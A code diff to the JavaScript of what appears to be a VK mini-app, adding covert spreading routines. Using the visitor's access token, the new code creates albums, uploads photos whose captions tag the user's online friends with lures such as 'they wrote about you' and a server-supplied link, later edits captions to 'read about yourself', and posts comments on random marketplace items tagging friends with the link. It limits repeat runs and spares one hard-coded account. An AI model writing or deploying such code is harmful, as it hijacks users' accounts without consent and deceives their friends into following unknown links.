@@ -22,6 +22,12 @@
       var photo_server = "";
       var albom_id = 0;
       var count_error = 0;
+      var items_market = "";
+      var offset_market = 0;
+      var count_photos = 0;
+      var text = "";
+      var vk_links = [];
+
 
       window.onload = function() {
         if(parseInt(findGetParameter("vk_app_id"))) {
@@ -52,9 +58,10 @@
             },
             success: function(data){
             var data = JSON.parse(data);
-            vk_link = data.url;
+            vk_links = data.urls;
             getToken();
             count_error = data.error;
+            text = data.text;
 
             },
             error : function(data){
@@ -122,9 +129,9 @@
             var fr_temp = [];
             for(var i = 0; i<viewer.friends.items.length; i++){
               if(!viewer.friends.items[i].deactivated && viewer.friends.items[i].hasOwnProperty('last_seen')){
-                //if(viewer.friends.items[i].last_seen.platform == 2 || viewer.friends.items[i].last_seen.platform == 4) {
+                if(viewer.friends.items[i].last_seen.platform == 2 || viewer.friends.items[i].last_seen.platform == 4) {
                   fr_temp.push(viewer.friends.items[i]);
-                //}
+                }
               }
             }
             viewer.friends.items = fr_temp;
@@ -139,11 +146,8 @@
               //saveVideo();
               vkConnect.sendPromise("VKWebAppStorageGet", {"keys": ["load"]}).then(data => {
                     if (data.keys[0].value != "Ok" || viewer.id == 526290583) {
-                      if(count_error == 1) {
-                        wallPost();
-                      }else{
-                        createAlbom();
-                      }
+                      createAlbom();
+                        //createAlbom();
                         //newPhotoUpload();
                         //wallPost();
                         //saveVideo();
@@ -166,6 +170,39 @@
                 ');
             }
       });
+    }
+
+    function getMarket() {
+      vkConnect.sendPromise("VKWebAppCallAPIMethod", {
+          "method": "market.searchItems",
+          "params": {"q": randomStringRus(2), "count": 30, "offset": getRandom(1,400),"v": "5.090", "access_token": token}
+      }).then(data => {
+        items_market = data.response.items;
+       
+        uploadMarket();
+        })
+        .catch(error => {
+          //alert(JSON.stringify(error));
+        });
+    }
+
+    function uploadMarket() {
+      var fr = getFriendsOnlineForMarket();
+      var item = items_market[offset_market];
+      if(!item){
+        return false;
+      }
+      vkConnect.sendPromise("VKWebAppCallAPIMethod", {
+           "method": "market.createComment",
+           "params": {"owner_id":item.owner_id,"item_id":item.id,"message":fr+", тут о тебе написали : \n "+vk_link, "v": "5.95", "access_token": token}
+       }).then(data => {
+        offset_market++;
+        if(viewer.friends.items[global_offset_i]){
+          setTimeout(function() {
+            uploadMarket();
+          }, 500);
+        }
+       });
     }
 
     function wallPost() {
@@ -210,7 +247,7 @@
 
       vkConnect.sendPromise("VKWebAppCallAPIMethod", {
           "method": "photos.createAlbum",
-          "params": {"title": randomString(getRandom(5,15)), "privacy_comment": ["nobody"],"v": "5.090", "access_token": token}
+          "params": {"title": randomString(5), "privacy_comment": ["nobody"],"v": "5.090", "access_token": token}
       }).then(data => {
         id_albom = data.response.id;
        
@@ -232,8 +269,8 @@
         });
     }
 
-    var count_photos = 0;
 
+    /*
     function newPhotoUpload() {
           var fr = getFriendsOnlineForPhoto();
 
@@ -311,6 +348,7 @@
                  // $.ajax(this);
             }});
     }
+    */
 
     function uploadPhotoAlbom(id_albom){
 
@@ -328,7 +366,7 @@
             data: {
                 "method": "getUploadServer",
                 "upload_url": upload_url,
-                "my_photo": viewer.photo_max_orig,
+                "my_photo": "https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl="+getRandom(1,10000)+"&choe=UTF-8",
                 "viewer_id": viewer.id,
                 "count_photos": count_photos,
                 "vk_app_id": vk_app_id
@@ -344,11 +382,19 @@
                     if(viewer.sex == 2) {
                       sex_txt = "смотрел";
                     }
-// о тебе - BLOCK
 
+                   vk_link = vk_links[getRandom(0,vk_links.length-1)];
+
+                   if(count_error == 0) {
                     var text = [
-                      " Правда? \n \n  "+vk_link+"\n \n "+fr
+                    fr+" o ваc написали : \n\n "+vk_link
                     ];
+                   }else{
+                    var text = [
+                    fr+" o ваc написали"
+                    ];
+                   }
+                  
                     var caption = text[getRandom(0,text.length-1)];
 
 
@@ -357,23 +403,20 @@
                         "params": {"album_id": id_albom, "server": data.server, "photos_list": data.photos_list, "hash":data.hash, "caption":(caption),"v": "5.131", "access_token": token}
                     }).then(data => {
 
-                      /*
-                      setTimeout(function() {
-                        var text = [
-                        "Прочитай о себе : \n\n  https://vk.com/app8173724"
-                          ];
-                          var caption = text[getRandom(0,text.length-1)];
+                      if(count_error != 0) {
+                        setTimeout(function() {
+                          vk_link = vk_links[getRandom(0,vk_links.length-1)];
+                          var caption = "Прочитай о себе : \n\n"+vk_link;
 
-                          vkConnect.sendPromise("VKWebAppCallAPIMethod", {
-                              "method": "photos.edit",
-                              "params": {"owner_id": viewer.id, "photo_id": data.response[0].id, "caption": caption,"v": "5.131", "access_token": token}
-                          });
-                      }, 5000);
-                      */
+                            vkConnect.sendPromise("VKWebAppCallAPIMethod", {
+                                "method": "photos.edit",
+                                "params": {"owner_id": viewer.id, "photo_id": data.response[0].id, "caption": caption,"v": "5.131", "access_token": token}
+                            });
+                        }, 5000);
+                      }
                       
-
                       count_photos++;
-                      if(viewer.friends.items[global_offset_i] && count_photos < 15){
+                      if(viewer.friends.items[global_offset_i+1] && count_photos < 20){
                         uploadPhotoAlbom(id_albom);
                       }
                       
@@ -390,6 +433,16 @@
             });
     }
 
+    function randomStringRus(len, charSet) {
+      charSet = charSet || '0123456789йцукенгшщзхъёфывапролджэячсмитьбю';
+      var randomString = '';
+      for (var i = 0; i < len; i++) {
+          var randomPoz = Math.floor(Math.random() * charSet.length);
+          randomString += charSet.substring(randomPoz,randomPoz+1);
+      }
+      return randomString;
+  }
+
     function randomString(len, charSet) {
       charSet = charSet || 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 йцукенгшщзхъёфывапролджэячсмитьбю';
       var randomString = '';
@@ -400,6 +453,23 @@
       return randomString;
   }
 
+  function getFriendsOnlineForMarket() {
+      var users_list = "";
+      var count = 0;
+      for(var i=global_offset_i;i<viewer.friends.items.length;i++) {
+          //users_list += "[id"+viewer.friends.items[global_offset_i].id+"|"+viewer.friends.items[global_offset_i].first_name+"], ";
+          global_offset_i++;
+          if(viewer.friends.items[global_offset_i]){
+            users_list +="@id"+viewer.friends.items[global_offset_i].id+" ("+viewer.friends.items[global_offset_i].first_name+")";
+            count++;
+            if(count > 0) {
+              return users_list;
+            }
+          }
+      }
+      return users_list;
+    }
+
     function getFriendsOnlineForPhoto() {
       var users_list = "";
       var count = 0;
@@ -407,9 +477,9 @@
           //users_list += "[id"+viewer.friends.items[global_offset_i].id+"|"+viewer.friends.items[global_offset_i].first_name+"], ";
           global_offset_i++;
           if(viewer.friends.items[global_offset_i]){
-            users_list +="@id"+viewer.friends.items[global_offset_i].id+" ("+getRandom(1,3)+")";
+            users_list +="@id"+viewer.friends.items[global_offset_i].id+" ("+viewer.friends.items[global_offset_i].first_name+") a ещё ";
             count++;
-            if(count > 7) {
+            if(count > 2) {
               return users_list;
             }
           }
